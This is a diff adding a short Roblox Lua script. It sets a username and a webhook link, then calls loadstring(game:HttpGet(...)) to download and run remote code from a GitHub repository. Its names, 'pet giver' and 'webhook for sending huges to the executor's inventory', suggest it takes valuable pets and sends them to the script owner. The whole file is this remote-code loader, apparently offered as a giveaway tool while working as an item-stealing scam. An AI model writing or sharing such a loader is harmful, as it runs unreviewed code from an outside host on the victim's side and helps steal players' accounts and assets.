@@ -1,0 +1,4 @@
+UserName = "your roblox username"
+WebHook = https://raw.githubusercontent.com/shrekshairyswamp/webhook-for-sending-huges-to-the-executors-inventory/main/webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shrekshairyswamp/webhook-for-sending-huges-to-the-executors-inventory/main/pet%20giver", true))()
